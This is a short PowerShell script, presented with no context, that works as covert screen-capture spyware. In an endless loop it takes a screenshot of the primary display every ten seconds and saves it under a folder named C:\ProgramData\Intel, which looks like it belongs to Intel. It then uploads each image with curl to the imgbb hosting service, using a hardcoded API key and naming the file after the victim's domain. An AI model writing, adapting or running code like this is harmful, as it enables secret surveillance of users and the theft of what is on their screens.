Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Take-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $filename = "C:\ProgramData\Intel\$ENV:USERDOMAIN.png"
    $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
}

while ($true) {
    Take-Screenshot
    Start-Sleep -Seconds 10
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    cmd.exe /c curl -X POST -F "image=@C:\ProgramData\Intel\%USERDOMAIN%.png" "https://api.imgbb.com/1/upload?key=e6bfb5c4ce427e600038fe8a3f4b4830^&expiration=604800^&name=%USERDOMAIN%-$timestamp"
}
